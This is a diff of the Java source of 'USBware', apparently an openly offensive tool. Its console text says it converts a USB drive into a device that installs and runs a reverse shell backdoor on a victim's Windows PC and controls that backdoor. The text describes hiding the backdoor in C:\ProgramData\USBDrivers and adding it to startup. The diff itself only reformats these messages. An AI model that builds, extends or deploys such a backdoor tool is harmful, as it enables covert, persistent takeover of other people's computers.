@@ -13,8 +13,8 @@ public class USBware {
 		System.out.println("▄• ▄▌.▄▄ · ▄▄▄▄· ▄▄▌ ▐ ▄▌ ▄▄▄· ▄▄▄  ▄▄▄ .\r\n█▪██▌▐█ ▀. ▐█ ▀█▪██· █▌▐█▐█ ▀█ ▀▄ █·▀▄.▀·\r\n"
 			+"█▌▐█▌▄▀▀▀█▄▐█▀▀█▄██▪▐█▐▐▌▄█▀▀█ ▐▀▀▄ ▐▀▀▪▄\r\n▐█▄█▌▐█▄▪▐███▄▪▐█▐█▌██▐█▌▐█ ▪▐▌▐█•█▌▐█▄▄▌\r\n ▀▀▀  ▀▀▀▀ ·▀▀▀▀  ▀▀▀▀ ▀▪ ▀  ▀ .▀  ▀ ▀▀▀ ");
 		System.out.println("Welcome to USBware");
-		System.out.println(
-			"This program can convert a USB drive into a tool that installs/runs a reverse shell backdoor on a victim's Windows PC,\nas well as control and send commands to this backdoor.\n");
+		System.out.println("This program can convert a USB drive into a tool that installs/runs a reverse shell backdoor on a victim's Windows PC,\n"
+			+"as well as control and send commands to this backdoor.\n");
 		System.out.println("Select:");
 		System.out.println("[0] Setup backdoor on a USB drive");
 		System.out.println("[1] Open backdoor control shell");
@@ -35,9 +35,9 @@ public class USBware {
 			System.out.println("Would you like to package the Java Runtime Environment from your computer with the backdoor\nso it can be run on computers without Java installed?(y/n):");
 			jre=Boolean.parseBoolean(getInput("yn"));
 		}else if(os.contains("Linux"))
-			System.out.println(
-				"If you would like to package a Java Runtime Environment with the backdoor so it can be run on computers without Java,\ncreate folder 'jre' in current directory with 'bin' and 'lib' folders from a Windows JRE distribution.\n");
-		System.out.println("Place all desired '.duck' DuckyScripts and '.ps1' PowerShell scripts in resources\\scripts\n");
+			System.out.println("If you would like to package a Java Runtime Environment with the backdoor so it can be run on computers without Java,\n"
+				+"create folder 'jre' in current directory with 'bin' and 'lib' folders from a Windows JRE distribution.\n");
+		System.out.println("Place all desired '.duck' DuckyScripts and '.ps1' PowerShell scripts in scripts\n");
 		System.out.println("Press ENTER to continue...");
 		sc.nextLine();
 		System.out.println("Converting...\n");
@@ -73,8 +73,8 @@ public class USBware {
 		}catch(InterruptedException e){}
 		System.out.println("Insert this USB drive into victim's computer and execute 'run.bat'\nThis will:\n");
 		if(choice2.equals("0"))
-			System.out.println(
-				"-Install the backdoor to 'C:\\ProgramData\\USBDrivers'\n-Add the backdoor to startup (if 'run.bat' executed as administrator)\n-Run the backdoor\n-Display information for controlling the backdoor\n");
+			System.out.println("-Install the backdoor to 'C:\\ProgramData\\USBDrivers'\n-Add the backdoor to startup (if 'run.bat' executed as administrator)\n-Run the backdoor\n"
+				+"-Display information for controlling the backdoor\n");
 		else if(choice2.equals("1"))
 			System.out.println("-Run the backdoor\n-Display information for controlling the backdoor\n");
 		System.out.println("Press ENTER to exit...");
